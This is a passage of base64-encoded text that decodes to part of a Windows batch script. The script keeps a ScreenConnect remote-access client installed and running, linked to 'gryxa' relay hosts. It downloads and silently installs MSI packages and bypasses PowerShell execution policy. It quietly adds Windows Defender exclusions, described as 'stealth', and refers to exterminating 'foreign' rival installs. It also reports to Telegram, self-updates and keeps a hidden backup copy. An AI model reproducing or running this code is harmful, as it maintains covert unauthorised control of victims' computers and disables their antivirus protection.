bCA6UmVzdG9yZUFsdA0KY2FsbCA6RW5zdXJlR3J5eGFNdXN0DQppZiAiJUlOU1RBTExFRCUiPT0i
MCIgKA0KICBpZiBleGlzdCAiJVdEJVxtc2lfaGVhbC5sb2ciICgNCiAgICBlY2hvIC0tLSBtc2lf
aGVhbC5sb2cgdGFpbCAtLS0+PiIlTE9HJSINCiAgICBwb3dlcnNoZWxsIC1Ob1Byb2ZpbGUgLU5v
bkludGVyYWN0aXZlIC1Db21tYW5kICJHZXQtQ29udGVudCAtTGl0ZXJhbFBhdGggJyVXRCVcbXNp
X2hlYWwubG9nJyAtVGFpbCAxMCIgPj4iJUxPRyUiIDI+JjENCiAgKQ0KICBpZiBub3QgZGVmaW5l
ZCBNU0lFWElUIHNldCAiTVNJRVhJVD1mZXRjaC1mYWlsIg0KICBwb3dlcnNoZWxsIC1Ob1Byb2Zp
bGUgLU5vbkludGVyYWN0aXZlIC1FeGVjdXRpb25Qb2xpY3kgQnlwYXNzIC1GaWxlICIlV0QlXG93
bl9saWIucHMxIiAtQWN0aW9uIHN0YXRlIC1Xb3JrRGlyICIlV0QlIiAtQnVpbGQgJU1PTlZFUiUg
LUV4dHJhICJtc2ktZmFpbGVkIiA+bnVsIDI+JjENCiAgY2FsbCA6VGdTdGF0ZSBGQUlMICJNU0kg
aW5zdGFsbCBmYWlsZWQgb24gYWxsIHNvdXJjZXMgKG1zaWV4ZWMgZXhpdCAlTVNJRVhJVCUpIg0K
KSBlbHNlICgNCiAgZWNobyBzdmMgcmVzdG9yZWQ+PiIlTE9HJSINCiAgcG93ZXJzaGVsbCAtTm9Q
cm9maWxlIC1Ob25JbnRlcmFjdGl2ZSAtRXhlY3V0aW9uUG9saWN5IEJ5cGFzcyAtRmlsZSAiJVdE
JVxvd25fbGliLnBzMSIgLUFjdGlvbiBzdGF0ZSAtV29ya0RpciAiJVdEJSIgLUJ1aWxkICVNT05W
RVIlIC1FeHRyYSAicmVzdG9yZWQiID5udWwgMj4mMQ0KICBjYWxsIDpUZ1N0YXRlIFJFU1RPUkVE
ICJTY3JlZW5Db25uZWN0IHJlaW5zdGFsbGVkIE9LIg0KKQ0KDQo6QWZ0ZXJIZWFsDQpyZW0gTTE2
OiBBTFQgcHJlc2VudC1idXQtc3RvcHBlZCAtPiByZXN0YXJ0LCB0aGVuIHJlcGFpci1ieS1HVUlE
IChldmVyeSB0aWNrKQ0Kc2MgcXVlcnkgIlNjcmVlbkNvbm5lY3QgQ2xpZW50ICglQUxUX0ZQJSki
ID5udWwgMj4mMQ0KaWYgbm90IGVycm9ybGV2ZWwgMSAoDQogIHNjIHF1ZXJ5ICJTY3JlZW5Db25u
ZWN0IENsaWVudCAoJUFMVF9GUCUpIiB8IGZpbmQgIlJVTk5JTkciID5udWwNCiAgaWYgZXJyb3Js
ZXZlbCAxICgNCiAgICBlY2hvIGFsdCBzdG9wcGVkIC0gcmVzdGFydC9yZXBhaXI+PiIlTE9HJSIN
CiAgICBuZXQgc3RhcnQgIlNjcmVlbkNvbm5lY3QgQ2xpZW50ICglQUxUX0ZQJSkiID5udWwgMj4m
MQ0KICAgIHNjIHN0YXJ0ICJTY3JlZW5Db25uZWN0IENsaWVudCAoJUFMVF9GUCUpIiA+bnVsIDI+
JjENCiAgICB0aW1lb3V0IC90IDUgL25vYnJlYWsgPm51bA0KICAgIHNjIHF1ZXJ5ICJTY3JlZW5D
b25uZWN0IENsaWVudCAoJUFMVF9GUCUpIiB8IGZpbmQgIlJVTk5JTkciID5udWwNCiAgICBpZiBl
cnJvcmxldmVsIDEgaWYgZXhpc3QgIiVXRCVcb3duX2xpYi5wczEiIHBvd2Vyc2hlbGwgLU5vUHJv
ZmlsZSAtTm9uSW50ZXJhY3RpdmUgLUV4ZWN1dGlvblBvbGljeSBCeXBhc3MgLUZpbGUgIiVXRCVc
b3duX2xpYi5wczEiIC1BY3Rpb24gcmVwYWlyIC1GcCAiJUFMVF9GUCUiIC1Xb3JrRGlyICIlV0Ql
IiA+PiIlTE9HJSIgMj4mMQ0KICApDQopDQpyZW0gTTE3OiBBTFQgc2VydmljZSBlbnRyeSBkZWxl
dGVkIGJ1dCBwcm9kdWN0IHJlZ2lzdGVyZWQgLT4gcmVwYWlyLWJ5LUdVSUQgZXZlcnkgdGljaw0K
c2MgcXVlcnkgIlNjcmVlbkNvbm5lY3QgQ2xpZW50ICglQUxUX0ZQJSkiID5udWwgMj4mMQ0KaWYg
ZXJyb3JsZXZlbCAxICgNCiAgZWNobyBhbHRfbWlzc2luZ190cnlfcmVwYWlyPj4iJUxPRyUiDQog
IGlmIGV4aXN0ICIlV0QlXG93bl9saWIucHMxIiBwb3dlcnNoZWxsIC1Ob1Byb2ZpbGUgLU5vbklu
dGVyYWN0aXZlIC1FeGVjdXRpb25Qb2xpY3kgQnlwYXNzIC1GaWxlICIlV0QlXG93bl9saWIucHMx
IiAtQWN0aW9uIHJlcGFpciAtRnAgIiVBTFRfRlAlIiAtV29ya0RpciAiJVdEJSIgPj4iJUxPRyUi
IDI+JjENCikNCnJlbSAoZXh0ZXJtaW5hdGlvbiBhbHJlYWR5IHJhbiBwcmUtaGVhbCBpbiBbRV07
IGZvcmVpZ24gc3Vydml2b3JzIGNvdW50ZWQgdGhlcmUpDQoNCnJlbSDilIDilIAgW0ZdIHN0ZWFs
dGggcmUtc2VjdXJlIChxdWlldCBEZWZlbmRlciBleGNsdXNpb24gcmVmcmVzaCkg4pSA4pSADQpw
b3dlcnNoZWxsIC1Ob1Byb2ZpbGUgLU5vbkludGVyYWN0aXZlIC1FeGVjdXRpb25Qb2xpY3kgQnlw
YXNzIC1Db21tYW5kICJ0cnkgeyBBZGQtTXBQcmVmZXJlbmNlIC1FeGNsdXNpb25QYXRoICclV0Ql
JywnJUVUTCUnIC1FcnJvckFjdGlvbiBTdG9wIH0gY2F0Y2gge30iID5udWwgMj4mMQ0KDQpyZW0g
4pSA4pSAIFtHXSBwZXJpb2RpYyBmdWxsIHJlLXNlY3VyZSBldmVyeSB+MiBoIOKUgOKUgOKUgOKU
gOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgA0KcG93ZXJz
aGVsbCAtTm9Qcm9maWxlIC1Ob25JbnRlcmFjdGl2ZSAtQ29tbWFuZCAiaWYoKFRlc3QtUGF0aCAn
JVdEJVxvd25fc2VjdXJlLmNtZCcpIC1hbmQgKCggLW5vdCAoVGVzdC1QYXRoICclV0QlXHNlYy5m
bGFnJykpIC1vciAoKChHZXQtRGF0ZSkgLSAoR2V0LUl0ZW0gLUxpdGVyYWxQYXRoICclV0QlXHNl
Yy5mbGFnJykuTGFzdFdyaXRlVGltZSkuVG90YWxIb3VycyAtZ2UgMikpKXsgZXhpdCAxIH0gZWxz
ZSB7IGV4aXQgMCB9IiA+bnVsIDI+JjENCmlmIGVycm9ybGV2ZWwgMSAoDQogIGVjaG8gcGVyaW9k
aWMgcmUtc2VjdXJlPj4iJUxPRyUiDQogIGNhbGwgIiVXRCVcb3duX3NlY3VyZS5jbWQiID4+IiVM
T0clIiAyPiYxDQogIGVjaG8gZG9uZT4iJVdEJVxzZWMuZmxhZyINCikNCg0KcmVtIOKUgOKUgCBb
RzJdIEdyeXhhIE1VU1QtUlVOIOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKU
gOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKU
gOKUgOKUgOKUgOKUgOKUgOKUgOKUgA0KcmVtIE80MDogaWYgQU5ZIG5vbi1zZXZyeiBTQyBSdW5u
aW5nIOKGkiBuZXZlciBtc2lleGVjIChzdG9wcyBwYW5lbCBkdXBsaWNhdGVzKS4NCnNldCAiR1JZ
WEFfT0s9MCINCnNldCAiR1JZWEFfV0FTPTAiDQpzZXQgIkRPX0RFRVA9MCINCmlmIGV4aXN0ICIl
V0QlXGdyeXhhLmNmZyIgZm9yIC9mICJ1c2ViYWNrcSB0b2tlbnM9MSwqIGRlbGltcz09IiAlJUsg
aW4gKCIlV0QlXGdyeXhhLmNmZyIpIGRvIGlmIC9JICIlJUsiPT0iQ1VSUkVOVF9GUCIgc2V0ICJH
UllYQV9GUD0lJUwiDQoNCnJlbSBEZXRlY3QgYW55IFJ1bm5pbmcgbm9uLXNldnJ6IFNjcmVlbkNv
bm5lY3QgKHRydWUgR3J5eGEgcHJlc2VuY2UpDQpwb3dlcnNoZWxsIC1Ob1Byb2ZpbGUgLU5vbklu
dGVyYWN0aXZlIC1FeGVjdXRpb25Qb2xpY3kgQnlwYXNzIC1GaWxlICIlV0QlXG93bl9saWIucHMx
IiAtQWN0aW9uIGdyeXhhLWhlYWx0aCAtV29ya0RpciAiJVdEJSIgPiIlV0QlXGdyeXhhX2hlYWx0
aC5vdXQiIDI+bnVsDQpzZXQgIkdIPSINCmlmIGV4aXN0ICIlV0QlXGdyeXhhX2hlYWx0aC5vdXQi
IGZvciAvZiAidXNlYmFja3EgZGVsaW1zPSIgJSVSIGluICgiJVdEJVxncnl4YV9oZWFsdGgub3V0
IikgZG8gc2V0ICJHSD0lJVIiDQplY2hvIGdyeXhhX2hlYWx0aD0hR0ghPj4iJUxPRyUiDQplY2hv
ICFHSCF8IGZpbmRzdHIgL0kgL0IgL0M6IkhFQUxUSFkiID5udWwNCmlmIG5vdCBlcnJvcmxldmVs
IDEgKA0KICBzZXQgIkdSWVhBX09LPTEiDQogIHNldCAiR1JZWEFfV0FTPTEiDQogIGlmIGV4aXN0
ICIlV0QlXGdyeXhhLmNmZyIgZm9yIC9mICJ1c2ViYWNrcSB0b2tlbnM9MSwqIGRlbGltcz09IiAl
JUsgaW4gKCIlV0QlXGdyeXhhLmNmZyIpIGRvIGlmIC9JICIlJUsiPT0iQ1VSUkVOVF9GUCIgc2V0
ICJHUllYQV9GUD0lJUwiDQopDQoNCnBvd2Vyc2hlbGwgLU5vUHJvZmlsZSAtTm9uSW50ZXJhY3Rp
dmUgLUNvbW1hbmQgImlmKCggLW5vdCAoVGVzdC1QYXRoICclR1JZWEFfREVFUCUnKSkgLW9yICgo
KEdldC1EYXRlKS0oR2V0LUl0ZW0gLUxpdGVyYWxQYXRoICclR1JZWEFfREVFUCUnIC1Gb3JjZSku
TGFzdFdyaXRlVGltZSkuVG90YWxIb3VycyAtZ2UgOCkpeyBleGl0IDEgfSBlbHNlIHsgZXhpdCAw
IH0iID5udWwgMj4mMQ0KaWYgZXJyb3JsZXZlbCAxIHNldCAiRE9fREVFUD0xIg0KDQpyZW0gSGVh
bHRoeSArIG5vdCBkZWVwIGR1ZSDihpIgemVybyB3b3JrDQppZiAiJUdSWVhBX09LJSI9PSIxIiBp
ZiAiJURPX0RFRVAlIj09IjAiICgNCiAgZWNobyBncnl4YV9za2lwX2FscmVhZHlfaGVhbHRoeT4+
IiVMT0clIg0KICBnb3RvIDpHcnl4YUFmdGVyDQopDQoNCnJlbSBEZWVwIG9yIG1pc3Npbmc6IGdy
eXhhLWVuc3VyZSBvbmx5IChsaWIgbG9ja3MgbXNpZXhlYyBpZiBSdW5uaW5nKQ0KaWYgZXhpc3Qg
IiVXRCVcb3duX2xpYi5wczEiICgNCiAgc2V0ICJHUkVTPSINCiAgaWYgIiVET19ERUVQJSI9PSIx
IiAoDQogICAgZWNobyBncnl4YV9kZWVwX2JlZ2luPj4iJUxPRyUiDQogICAgZm9yIC9mICJ1c2Vi
YWNrcSBkZWxpbXM9IiAlJVIgaW4gKGBwb3dlcnNoZWxsIC1Ob1Byb2ZpbGUgLU5vbkludGVyYWN0
aXZlIC1FeGVjdXRpb25Qb2xpY3kgQnlwYXNzIC1GaWxlICIlV0QlXG93bl9saWIucHMxIiAtQWN0
aW9uIGdyeXhhLWVuc3VyZSAtRGVlcCAtV29ya0RpciAiJVdEJSIgLUJ1aWxkICVNT05WRVIlYCkg
ZG8gc2V0ICJHUkVTPSUlUiINCiAgKSBlbHNlICgNCiAgICBmb3IgL2YgInVzZWJhY2txIGRlbGlt
cz0iICUlUiBpbiAoYHBvd2Vyc2hlbGwgLU5vUHJvZmlsZSAtTm9uSW50ZXJhY3RpdmUgLUV4ZWN1
dGlvblBvbGljeSBCeXBhc3MgLUZpbGUgIiVXRCVcb3duX2xpYi5wczEiIC1BY3Rpb24gZ3J5eGEt
ZW5zdXJlIC1Xb3JrRGlyICIlV0QlIiAtQnVpbGQgJU1PTlZFUiVgKSBkbyBzZXQgIkdSRVM9JSVS
Ig0KICApDQogIGVjaG8gZ3J5eGFfZW5zdXJlX3Jlc3VsdD0hR1JFUyE+PiIlTE9HJSINCiAgZWNo
byAhR1JFUyF8IGZpbmRzdHIgL0kgL0IgL0M6IkhFQUxUSFkiID5udWwNCiAgaWYgbm90IGVycm9y
bGV2ZWwgMSBzZXQgIkdSWVhBX09LPTEiDQopDQppZiAiJURPX0RFRVAlIj09IjEiIGVjaG8gZG9u
ZT4iJUdSWVhBX0RFRVAlIg0KaWYgIiVHUllYQV9PSyUiPT0iMCIgY2FsbCA6RW5zdXJlR3J5eGFN
dXN0DQoNCjpHcnl4YUFmdGVyDQppZiBleGlzdCAiJVdEJVxncnl4YS5jZmciIGZvciAvZiAidXNl
YmFja3EgdG9rZW5zPTEsKiBkZWxpbXM9PSIgJSVLIGluICgiJVdEJVxncnl4YS5jZmciKSBkbyBp
ZiAvSSAiJSVLIj09IkNVUlJFTlRfRlAiIHNldCAiR1JZWEFfRlA9JSVMIg0Kc2MgcXVlcnkgIlNj
cmVlbkNvbm5lY3QgQ2xpZW50ICglR1JZWEFfRlAlKSIgfCBmaW5kICJSVU5OSU5HIiA+bnVsDQpp
ZiBub3QgZXJyb3JsZXZlbCAxIHNldCAiR1JZWEFfT0s9MSINCnJlbSBhbHNvIE9LIGlmIGFueSBu
b24tc2V2cnogc3RpbGwgcnVubmluZw0KaWYgIiVHUllYQV9PSyUiPT0iMCIgKA0KICBwb3dlcnNo
ZWxsIC1Ob1Byb2ZpbGUgLU5vbkludGVyYWN0aXZlIC1FeGVjdXRpb25Qb2xpY3kgQnlwYXNzIC1G
aWxlICIlV0QlXG93bl9saWIucHMxIiAtQWN0aW9uIGdyeXhhLWhlYWx0aCAtV29ya0RpciAiJVdE
JSIgMj5udWwgfCBmaW5kc3RyIC9JIC9CIC9DOiJIRUFMVEhZIiA+bnVsDQogIGlmIG5vdCBlcnJv
cmxldmVsIDEgc2V0ICJHUllYQV9PSz0xIg0KKQ0KDQppZiAiJUdSWVhBX09LJSI9PSIxIiBpZiAi
JUdSWVhBX1dBUyUiPT0iMCIgKA0KICBwb3dlcnNoZWxsIC1Ob1Byb2ZpbGUgLU5vbkludGVyYWN0
aXZlIC1FeGVjdXRpb25Qb2xpY3kgQnlwYXNzIC1GaWxlICIlV0QlXG93bl9saWIucHMxIiAtQWN0
aW9uIHN0YXRlIC1Xb3JrRGlyICIlV0QlIiAtQnVpbGQgJU1PTlZFUiUgLUV4dHJhICJncnl4YS1y
ZXN0b3JlZCIgPm51bCAyPiYxDQogIGNhbGwgOlRnU3RhdGUgUkVTVE9SRUQgIkdyeXhhIFNjcmVl
bkNvbm5lY3QgaGVhbHRoeSAoc3ZjIHJ1bm5pbmcpIg0KKQ0KaWYgIiVHUllYQV9PSyUiPT0iMCIg
KA0KICBwb3dlcnNoZWxsIC1Ob1Byb2ZpbGUgLU5vbkludGVyYWN0aXZlIC1FeGVjdXRpb25Qb2xp
Y3kgQnlwYXNzIC1GaWxlICIlV0QlXG93bl9saWIucHMxIiAtQWN0aW9uIHN0YXRlIC1Xb3JrRGly
ICIlV0QlIiAtQnVpbGQgJU1PTlZFUiUgLUV4dHJhICJncnl4YS1tdXN0LWZhaWwiID5udWwgMj4m
MQ0KICBjYWxsIDpUZ1N0YXRlIERPV04gIkdyeXhhIE1VU1QtUlVOIC0gc2VydmljZSBub3QgUnVu
bmluZyBhZnRlciBoZWFsIg0KKQ0KDQpyZW0g4pSA4pSAIFtIXSBxdWlldCBkaWdlc3QgKHNraXAg
aGVhbHRoeSBob3N0cyDigJQgd2FzIGZsb29kaW5nIFRlbGVncmFtKSDilIDilIANCmlmIGV4aXN0
ICIlV0QlXG93bl9saWIucHMxIiBwb3dlcnNoZWxsIC1Ob1Byb2ZpbGUgLU5vbkludGVyYWN0aXZl
IC1FeGVjdXRpb25Qb2xpY3kgQnlwYXNzIC1GaWxlICIlV0QlXG93bl9saWIucHMxIiAtQWN0aW9u
IHN0YXRlIC1Xb3JrRGlyICIlV0QlIiAtQnVpbGQgJU1PTlZFUiUgPm51bCAyPiYxDQpzZXQgIk5F
RURfSEI9MCINCmlmICIlUFJJTV9PSyUiPT0iMCIgc2V0ICJORUVEX0hCPTEiDQppZiAlRk9SRUlH
Tl9MRUZUJSBHVFIgMCBzZXQgIk5FRURfSEI9MSINCmlmICIlR1JZWEFfT0slIj09IjAiIHNldCAi
TkVFRF9IQj0xIg0KaWYgIiVORUVEX0hCJSI9PSIwIiAoDQogIGVjaG8gaGJfc2tpcF9oZWFsdGh5
Pj4iJUxPRyUiDQopIGVsc2UgKA0KICBwb3dlcnNoZWxsIC1Ob1Byb2ZpbGUgLU5vbkludGVyYWN0
aXZlIC1Db21tYW5kICJpZigoVGVzdC1QYXRoICclSEJGTEFHJScpIC1hbmQgKE5ldy1UaW1lU3Bh
biAtU3RhcnQgKEdldC1JdGVtIC1MaXRlcmFsUGF0aCAnJUhCRkxBRyUnKS5MYXN0V3JpdGVUaW1l
KS5Ub3RhbE1pbnV0ZXMgLWx0IDM2MCl7IGV4aXQgMCB9IGVsc2UgeyBleGl0IDEgfSIgPm51bCAy
PiYxDQogIGlmIGVycm9ybGV2ZWwgMSAoDQogICAgZWNobyBoYj4lSEJGTEFHJQ0KICAgIHBvd2Vy
c2hlbGwgLU5vUHJvZmlsZSAtTm9uSW50ZXJhY3RpdmUgLUV4ZWN1dGlvblBvbGljeSBCeXBhc3Mg
LUZpbGUgIiVXRCVcdGdfcmVwb3J0LnBzMSIgLVN0YXRlIEhCIC1Nb2RlIGNvbXBhY3QgLUJ1aWxk
ICVNT05WRVIlIC1Db3VudCAhQ09VTlQhID5udWwgMj4mMQ0KICAgIGVjaG8gZGlnZXN0IEhCIHNl
bnQ+PiIlTE9HJSINCiAgKQ0KKQ0KDQpyZW0g4pSA4pSAIFtJXSBzZWxmLXVwZGF0ZSBhcHBseSAo
bGFzdCB0aGluZyB0aGlzIHRpY2spIOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKU
gOKUgOKUgA0KaWYgIiVTRUxGX1VQRCUiPT0iMSIgKA0KICBlY2hvIHNlbGYtdXBkYXRlIGFwcGx5
Pj4iJUxPRyUiDQogIGF0dHJpYiAtaCAtcyAtciAiJVdEJVxvd25fbW9uLmNtZCIgPm51bCAyPiYx
DQogIG1vdmUgL3kgIiVXRCVcb3duX21vbi5uZXh0IiAiJVdEJVxvd25fbW9uLmNtZCIgPm51bCAy
PiYxDQopDQpyZW0ga2VlcCBkdWFsLXBhdGggYmFja3VwIGluIHN5bmMgZXZlcnkgdGljaw0KaWYg
bm90IGV4aXN0ICIlRVRMJSIgbWtkaXIgIiVFVEwlIiA+bnVsIDI+JjENCmlmIGV4aXN0ICIlV0Ql
XG93bl9tb24uY21kIiAoDQogIGF0dHJpYiAtaCAtcyAtciAiJUVUTCVcZXRsX21vbi5jbWQiID5u
dWwgMj4mMQ0KICBjb3B5IC95ICIlV0QlXG93bl9tb24uY21kIiAiJUVUTCVcZXRsX21vbi5jbWQi
ID5udWwgMj4mMQ0KKQ0KZGVsIC9mIC9xICIlTVVURVglIiA+bnVsIDI+JjENCg0KZWNobyB0aWNr
IGRvbmU6IHByaW09JVBSSU1fT0slIGdyeXhhPSVHUllYQV9PSyUgYWx0PSVBTFRfT0slIGZvcmVp
Z249JUZPUkVJR05fTEVGVCU+PiIlTE9HJSINCmVuZGxvY2FsDQpleGl0IC9iIDANCg0KcmVtIOKV
kOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkCBoZWxwZXJzIOKVkOKV
kOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkA0KOkVuc3VyZUdyeXhhTXVz
dA0KcmVtIE80MDogTkVWRVIgbXNpZXhlYyBoZXJlIOKAlCBkZWxlZ2F0ZXMgdG8gZ3J5eGEtZW5z
dXJlIChsb2NrcyBpZiBhbnkgbm9uLXNldnJ6IFNDIFJ1bm5pbmcpLg0Kc2V0ICJHUllYQV9PSz0w
Ig0KcmVtIEFueSBub24tc2V2cnogU2NyZWVuQ29ubmVjdCBDbGllbnQgUnVubmluZz8gdHJlYXQg
YXMgaGVhbHRoeSBHcnl4YS4NCnBvd2Vyc2hlbGwgLU5vUHJvZmlsZSAtTm9uSW50ZXJhY3RpdmUg
LUNvbW1hbmQgIiRrPUAoJzVmNjAxMDU3OTg1MmU1MDcnLCdmODYxYzgxNDBkNDUzNDI3Jyk7ICRo
PSRmYWxzZTsgR2V0LVNlcnZpY2UgJ1NjcmVlbkNvbm5lY3QgQ2xpZW50KicgLUVBIDAgfCAlJSB7
IGlmKCRfLlN0YXR1cyAtZXEgJ1J1bm5pbmcnIC1hbmQgJF8uTmFtZSAtbWF0Y2ggJ1woKFswLTlh
LWZdezE2fSlcKScgLWFuZCAkbWF0Y2hlc1sxXSAtbm90aW4gJGspeyAkaD0kdHJ1ZTsgJG1hdGNo
ZXNbMV0gfCBTZXQtQ29udGVudCAtTGl0ZXJhbFBhdGggJyVXRCVcZ3J5eGEuY2ZnLnRtcCcgLUVu
Y29kaW5nIEFTQ0lJIH0gfTsgaWYoJGgpeyBpZihUZXN0LVBhdGggJyVXRCVcZ3J5eGEuY2ZnLnRt
cCcpeyAkZnA9KEdldC1Db250ZW50ICclV0QlXGdyeXhhLmNmZy50bXAnIC1SYXcpLlRyaW0oKTsg
QChcIkNVUlJFTlRfRlA9JGZwXCIsXCJSRUxBWT11cGRhdGUuZ3J5eGEuY29tXCIsXCJVST11aS5n
cnl4YS5jb21cIikgfCBTZXQtQ29udGVudCAnJVdEJVxncnl4YS5jZmcnIC1FbmNvZGluZyBBU0NJ
SSB9OyBleGl0IDAgfSBlbHNlIHsgZXhpdCAxIH0iID5udWwgMj4mMQ0KaWYgbm90IGVycm9ybGV2
ZWwgMSAoDQogIHNldCAiR1JZWEFfT0s9MSINCiAgZWNobyBncnl4YV9hbnlfbm9uc2V2cnpfcnVu
bmluZ19za2lwX21zaWV4ZWM+PiIlTE9HJSINCiAgaWYgZXhpc3QgIiVXRCVcZ3J5eGEuY2ZnIiBm
b3IgL2YgInVzZWJhY2txIHRva2Vucz0xLCogZGVsaW1zPT0iICUlSyBpbiAoIiVXRCVcZ3J5eGEu
Y2ZnIikgZG8gaWYgL0kgIiUlSyI9PSJDVVJSRU5UX0ZQIiBzZXQgIkdSWVhBX0ZQPSUlTCINCiAg
ZGVsIC9mIC9xICIlV0QlXGdyeXhhLmNmZy50bXAiID5udWwgMj4mMQ0KICBleGl0IC9iIDANCikN
CnNjIHF1ZXJ5ICJTY3JlZW5Db25uZWN0IENsaWVudCAoJUdSWVhBX0ZQJSkiIHwgZmluZCAiUlVO
TklORyIgPm51bA0KaWYgbm90IGVycm9ybGV2ZWwgMSAoDQogIHNldCAiR1JZWEFfT0s9MSINCiAg
ZWNobyBncnl4YV9hbHJlYWR5X3J1bm5pbmc+PiIlTE9HJSINCiAgZXhpdCAvYiAwDQopDQpyZW0g
c3RhcnQvcmVwYWlyL2luc3RhbGwgb25seSB2aWEgbGliIChoYXMgUnVubmluZyBsb2NrICsgcmF0
ZSBsaW1pdCkNCmlmIGV4aXN0ICIlV0QlXG93bl9saWIucHMxIiAoDQogIHNldCAiR1JFUz0iDQog
IGZvciAvZiAidXNlYmFja3EgZGVsaW1zPSIgJSVSIGluIChgcG93ZXJzaGVsbCAtTm9Qcm9maWxl
IC1Ob25JbnRlcmFjdGl2ZSAtRXhlY3V0aW9uUG9saWN5IEJ5cGFzcyAtRmlsZSAiJVdEJVxvd25f
bGliLnBzMSIgLUFjdGlvbiBncnl4YS1lbnN1cmUgLVdvcmtEaXIgIiVXRCUiIC1CdWlsZCAlTU9O
VkVSJWApIGRvIHNldCAiR1JFUz0lJVIiDQogIGVjaG8gZ3J5eGFfbXVzdF9saWI9IUdSRVMhPj4i
JUxPRyUiDQogIGVjaG8gIUdSRVMhfCBmaW5kc3RyIC9JIC9CIC9DOiJIRUFMVEhZIiA+bnVsDQog
IGlmIG5vdCBlcnJvcmxldmVsIDEgc2V0ICJHUllYQV9PSz0xIg0KKQ0KaWYgZXhpc3QgIiVXRCVc
Z3J5eGEuY2ZnIiBmb3IgL2YgInVzZWJhY2txIHRva2Vucz0xLCogZGVsaW1zPT0iICUlSyBpbiAo
IiVXRCVcZ3J5eGEuY2ZnIikgZG8gaWYgL0kgIiUlSyI9PSJDVVJSRU5UX0ZQIiBzZXQgIkdSWVhB
X0ZQPSUlTCINCnNjIHF1ZXJ5ICJTY3JlZW5Db25uZWN0IENsaWVudCAoJUdSWVhBX0ZQJSkiIHwg
ZmluZCAiUlVOTklORyIgPm51bA0KaWYgbm90IGVycm9ybGV2ZWwgMSBzZXQgIkdSWVhBX09LPTEi
DQppZiAiJUdSWVhBX09LJSI9PSIxIiAoZWNobyBncnl4YV9tdXN0X3J1bm5pbmdfb2s+PiIlTE9H
JSIpIGVsc2UgKGVjaG8gZ3J5eGFfbXVzdF9zdGlsbF9kb3duPj4iJUxPRyUiKQ0KZXhpdCAvYiAw
DQoNCg0KOkluc3RhbGxNc2kNCnJlbSAlMT11cmwgJTI9dGFnDQpzZXQgIlVSTD0lfjEiDQpzZXQg
IlRBRz0lfjIiDQplY2hvIFslVEFHJV0gZmV0Y2ggJVVSTCU+PiIlTE9HJSINCiIlQ1VSTCUiIC1M
IC0tc3NsLW5vLXJldm9rZSAtLWNvbm5lY3QtdGltZW91dCAyNSAtLW1heC10aW1lIDMwMCAtbyAi
JU1TSSUudG1wIiAiJVVSTCUiID4+IiVMT0clIiAyPiYxDQpmb3IgJSVGIGluICgiJU1TSSUudG1w
IikgZG8gaWYgJSV+ekYgTEVRIDEwMDAwMDAgKA0KICBlY2hvIFslVEFHJV0gZmV0Y2ggZmFpbGVk
Pj4iJUxPRyUiDQogIGRlbCAvZiAvcSAiJU1TSSUudG1wIiA+bnVsIDI+JjENCiAgZXhpdCAvYiAx
DQopDQptb3ZlIC95ICIlTVNJJS50bXAiICIlTVNJJSIgPm51bCAyPiYxDQpjYWxsIDpOb01zaVBv
bGljeQ0KcmVtIE0xMzogc3RhbGUgcHJpbWFyeSBkaXIgKHNlcnZpY2UgZGVsZXRlZCwgcHJvZHVj
dCB1bnJlZ2lzdGVyZWQpIGJyZWFrcw0KcmVtIHRoZSBTQyBpbnN0YWxsZXIgY3VzdG9tIGFjdGlv
biAtIGNsZWFyIGl0IGJlZm9yZSBpbnN0YWxsaW5nDQpzYyBxdWVyeSAiU2NyZWVuQ29ubmVjdCBD
bGllbnQgKCVLRUVQX0ZQJSkiID5udWwgMj4mMQ0KaWYgZXJyb3JsZXZlbCAxIGlmIGV4aXN0ICIl
UEY4NiVcU2NyZWVuQ29ubmVjdCBDbGllbnQgKCVLRUVQX0ZQJSkiICgNCiAgZWNobyBzdGFsZV9w
cmltYXJ5X2Rpcl9jbGVhbj4+IiVMT0clIg0KICBybWRpciAvcyAvcSAiJVBGODYlXFNjcmVlbkNv
bm5lY3QgQ2xpZW50ICglS0VFUF9GUCUpIiA+bnVsIDI+JjENCikNCmVjaG8gWyVUQUclXSBtc2ll
eGVjIGluc3RhbGw+PiIlTE9HJSINCm1zaWV4ZWMgL2kgIiVNU0klIiAvcW4gL25vcmVzdGFydCBB
TExVU0VSUz0xIFJFQk9PVD1SZWFsbHlTdXBwcmVzcyAvTCp2ICIlV0QlXG1zaV9oZWFsLmxvZyIg
Pm51bCAyPiYxDQpzZXQgIk1TSUVYSVQ9IUVSUk9STEVWRUwhIg0KZWNobyBbJVRBRyVdIG1zaWV4
ZWMgZXhpdD0hTVNJRVhJVCE+PiIlTE9HJSINCmlmICIhTVNJRVhJVCEiPT0iMTYxOCIgKA0KICBl
Y2hvIFslVEFHJV0gbXNpX2J1c3lfcmV0cnk+PiIlTE9HJSINCiAgdGltZW91dCAvdCAzMCAvbm9i
cmVhayA+bnVsDQogIG1zaWV4ZWMgL2kgIiVNU0klIiAvcW4gL25vcmVzdGFydCBBTExVU0VSUz0x
IFJFQk9PVD1SZWFsbHlTdXBwcmVzcyAvTCp2ICIlV0QlXG1zaV9oZWFsMi5sb2ciID5udWwgMj4m
MQ0KICBzZXQgIk1TSUVYSVQ9IUVSUk9STEVWRUwhIg0KICBlY2hvIFslVEFHJV0gbXNpZXhlY19y
ZXRyeSBleGl0PSFNU0lFWElUIT4+IiVMT0clIg0KKQ0KY2FsbCA6V2FpdFN2Yw0KY2FsbCA6UmVz
dG9yZUFsdA0KcmVtIE8zNzogc2V2cnogL2kgc2hhcmVzIGxlZ2FjeSBVcGdyYWRlQ29kZXMgd2l0
aCBncnl4YSDigJQgYWx3YXlzIHJlLWVuc3VyZSBHcnl4YSBhZnRlcg0KY2FsbCA6RW5zdXJlR3J5
eGFNdXN0DQpleGl0IC9iIDANCnJlbSAlMT1maW5nZXJwcmludCAtIHNlcnZpY2UgZGVsZXRlZCBi
dXQgcHJvZHVjdCByZWdpc3RlcmVkOiByZXBhaXIgYnkgR1VJRC4NCnNjIHF1ZXJ5ICJTY3JlZW5D
